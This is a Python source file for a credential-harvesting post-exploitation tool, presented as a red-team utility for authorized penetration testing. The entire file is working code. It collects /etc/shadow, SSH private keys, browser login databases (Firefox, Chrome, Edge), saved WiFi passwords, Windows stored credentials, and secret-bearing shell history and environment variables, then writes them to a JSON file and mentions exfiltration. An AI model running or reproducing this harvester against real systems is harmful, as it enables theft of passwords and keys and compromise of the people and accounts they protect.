#!/usr/bin/env python3
"""
Credential Harvester - Post-Exploitation Module
Extracts credentials from various sources on the target system
For authorized penetration testing only
"""

import os
import sys
import json
import subprocess
import sqlite3
import base64
from pathlib import Path
import platform

class CredentialHarvester:
    def __init__(self):
        self.os_type = platform.system()
        self.credentials = []
        
    def harvest_all(self):
        """Harvest credentials from all available sources"""
        print("[*] Starting credential harvesting...")
        
        if self.os_type == "Linux":
            self.harvest_linux()
        elif self.os_type == "Windows":
            self.harvest_windows()
        elif self.os_type == "Darwin":
            self.harvest_macos()
        
        return self.credentials
    
    def harvest_linux(self):
        """Harvest credentials from Linux system"""
        print("[*] Harvesting Linux credentials...")
        
        # Shadow file (requires root)
        try:
            if os.geteuid() == 0:
                with open('/etc/shadow', 'r') as f:
                    shadow = f.read()
                    self.credentials.append({
                        'type': 'shadow_hashes',
                        'data': shadow
                    })
                    print("[+] Extracted /etc/shadow")
        except:
            pass
        
        # SSH keys
        try:
            ssh_dir = os.path.expanduser('~/.ssh')
            if os.path.exists(ssh_dir):
                for key_file in ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519']:
                    key_path = os.path.join(ssh_dir, key_file)
                    if os.path.exists(key_path):
                        with open(key_path, 'r') as f:
                            self.credentials.append({
                                'type': 'ssh_private_key',
                                'file': key_file,
                                'data': f.read()
                            })
                            print(f"[+] Found SSH key: {key_file}")
        except:
            pass
        
        # Browser passwords (Firefox)
        self.harvest_firefox_linux()
        
        # Bash history (may contain passwords)
        try:
            hist_path = os.path.expanduser('~/.bash_history')
            if os.path.exists(hist_path):
                with open(hist_path, 'r') as f:
                    history = f.read()
                    # Look for common password patterns
                    sensitive_lines = [line for line in history.split('\n') 
                                     if any(word in line.lower() for word in 
                                           ['password', 'passwd', 'pwd', 'pass=', 'token', 'api_key', 'secret'])]
                    if sensitive_lines:
                        self.credentials.append({
                            'type': 'bash_history',
                            'data': '\n'.join(sensitive_lines)
                        })
                        print(f"[+] Found {len(sensitive_lines)} potentially sensitive commands in history")
        except:
            pass
        
        # Environment variables
        try:
            env_secrets = {k: v for k, v in os.environ.items() 
                          if any(word in k.lower() for word in 
                                ['password', 'token', 'key', 'secret', 'api'])}
            if env_secrets:
                self.credentials.append({
                    'type': 'environment_variables',
                    'data': env_secrets
                })
                print(f"[+] Found {len(env_secrets)} potentially sensitive environment variables")
        except:
            pass
    
    def harvest_windows(self):
        """Harvest credentials from Windows system"""
        print("[*] Harvesting Windows credentials...")
        
        # Saved WiFi passwords
        try:
            wifi_profiles = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True,
                text=True
            ).stdout
            
            wifi_creds = []
            for line in wifi_profiles.split('\n'):
                if 'All User Profile' in line:
                    profile = line.split(':')[1].strip()
                    pwd_result = subprocess.run(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                        capture_output=True,
                        text=True
                    ).stdout
                    
                    for pwd_line in pwd_result.split('\n'):
                        if 'Key Content' in pwd_line:
                            password = pwd_line.split(':')[1].strip()
                            wifi_creds.append({
                                'ssid': profile,
                                'password': password
                            })
            
            if wifi_creds:
                self.credentials.append({
                    'type': 'wifi_passwords',
                    'data': wifi_creds
                })
                print(f"[+] Found {len(wifi_creds)} WiFi passwords")
        except:
            pass
        
        # Browser passwords
        self.harvest_chrome_windows()
        self.harvest_edge_windows()
        
        # Saved RDP credentials
        try:
            rdp_creds = subprocess.run(
                ['cmdkey', '/list'],
                capture_output=True,
                text=True
            ).stdout
            
            if rdp_creds:
                self.credentials.append({
                    'type': 'saved_credentials',
                    'data': rdp_creds
                })
                print("[+] Extracted saved Windows credentials")
        except:
            pass
        
        # PowerShell history (may contain passwords)
        try:
            ps_history = os.path.expanduser(
                '~\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'
            )
            if os.path.exists(ps_history):
                with open(ps_history, 'r', encoding='utf-8', errors='ignore') as f:
                    history = f.read()
                    sensitive_lines = [line for line in history.split('\n') 
                                     if any(word in line.lower() for word in 
                                           ['password', 'credential', 'token', 'api', 'secret'])]
                    if sensitive_lines:
                        self.credentials.append({
                            'type': 'powershell_history',
                            'data': '\n'.join(sensitive_lines)
                        })
                        print(f"[+] Found {len(sensitive_lines)} potentially sensitive PowerShell commands")
        except:
            pass
    
    def harvest_macos(self):
        """Harvest credentials from macOS system"""
        print("[*] Harvesting macOS credentials...")
        
        # SSH keys
        try:
            ssh_dir = os.path.expanduser('~/.ssh')
            if os.path.exists(ssh_dir):
                for key_file in ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519']:
                    key_path = os.path.join(ssh_dir, key_file)
                    if os.path.exists(key_path):
                        with open(key_path, 'r') as f:
                            self.credentials.append({
                                'type': 'ssh_private_key',
                                'file': key_file,
                                'data': f.read()
                            })
                            print(f"[+] Found SSH key: {key_file}")
        except:
            pass
        
        # Browser passwords
        self.harvest_chrome_macos()
        self.harvest_safari_macos()
    
    def harvest_firefox_linux(self):
        """Extract passwords from Firefox on Linux"""
        try:
            firefox_dir = os.path.expanduser('~/.mozilla/firefox')
            if not os.path.exists(firefox_dir):
                return
            
            for profile in os.listdir(firefox_dir):
                profile_path = os.path.join(firefox_dir, profile)
                logins_db = os.path.join(profile_path, 'logins.json')
                
                if os.path.exists(logins_db):
                    with open(logins_db, 'r') as f:
                        logins = json.load(f)
                        self.credentials.append({
                            'type': 'firefox_passwords',
                            'profile': profile,
                            'data': logins
                        })
                        print(f"[+] Extracted Firefox passwords from profile: {profile}")
        except:
            pass
    
    def harvest_chrome_windows(self):
        """Extract passwords from Chrome on Windows"""
        try:
            chrome_path = os.path.expanduser(
                r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data'
            )
            if os.path.exists(chrome_path):
                # Copy database (can't read while Chrome is running)
                import shutil
                temp_db = chrome_path + '.tmp'
                shutil.copy2(chrome_path, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                
                chrome_creds = []
                for row in cursor.fetchall():
                    chrome_creds.append({
                        'url': row[0],
                        'username': row[1],
                        'password': base64.b64encode(row[2]).decode()  # Encrypted, needs DPAPI
                    })
                
                conn.close()
                os.remove(temp_db)
                
                if chrome_creds:
                    self.credentials.append({
                        'type': 'chrome_passwords',
                        'data': chrome_creds,
                        'note': 'Passwords are encrypted with DPAPI'
                    })
                    print(f"[+] Extracted {len(chrome_creds)} Chrome passwords")
        except:
            pass
    
    def harvest_edge_windows(self):
        """Extract passwords from Edge on Windows"""
        try:
            edge_path = os.path.expanduser(
                r'~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
            )
            if os.path.exists(edge_path):
                import shutil
                temp_db = edge_path + '.tmp'
                shutil.copy2(edge_path, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                
                edge_creds = []
                for row in cursor.fetchall():
                    edge_creds.append({
                        'url': row[0],
                        'username': row[1],
                        'password': base64.b64encode(row[2]).decode()
                    })
                
                conn.close()
                os.remove(temp_db)
                
                if edge_creds:
                    self.credentials.append({
                        'type': 'edge_passwords',
                        'data': edge_creds,
                        'note': 'Passwords are encrypted with DPAPI'
                    })
                    print(f"[+] Extracted {len(edge_creds)} Edge passwords")
        except:
            pass
    
    def harvest_chrome_macos(self):
        """Extract passwords from Chrome on macOS"""
        try:
            chrome_path = os.path.expanduser(
                '~/Library/Application Support/Google/Chrome/Default/Login Data'
            )
            if os.path.exists(chrome_path):
                import shutil
                temp_db = '/tmp/chrome_login.tmp'
                shutil.copy2(chrome_path, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                
                chrome_creds = []
                for row in cursor.fetchall():
                    chrome_creds.append({
                        'url': row[0],
                        'username': row[1],
                        'password': base64.b64encode(row[2]).decode()
                    })
                
                conn.close()
                os.remove(temp_db)
                
                if chrome_creds:
                    self.credentials.append({
                        'type': 'chrome_passwords_macos',
                        'data': chrome_creds,
                        'note': 'Passwords are encrypted with keychain'
                    })
                    print(f"[+] Extracted {len(chrome_creds)} Chrome passwords")
        except:
            pass
    
    def harvest_safari_macos(self):
        """Extract passwords from Safari on macOS"""
        # Note: Safari uses Keychain which requires additional privileges
        print("[*] Safari passwords are stored in macOS Keychain (requires additional access)")
    
    def save_results(self, output_file='credentials.json'):
        """Save harvested credentials to file"""
        with open(output_file, 'w') as f:
            json.dump(self.credentials, f, indent=2)
        print(f"\n[+] Credentials saved to: {output_file}")
        print(f"[+] Total credential sources found: {len(self.credentials)}")

def main():
    print("="*60)
    print("Credential Harvester - Red Team Tool")
    print("For Authorized Penetration Testing Only")
    print("="*60 + "\n")
    
    harvester = CredentialHarvester()
    harvester.harvest_all()
    harvester.save_results()
    
    print("\n[!] Remember to securely delete this file after exfiltration")
    print("[!] Always handle credentials responsibly during engagements")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Harvesting interrupted")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
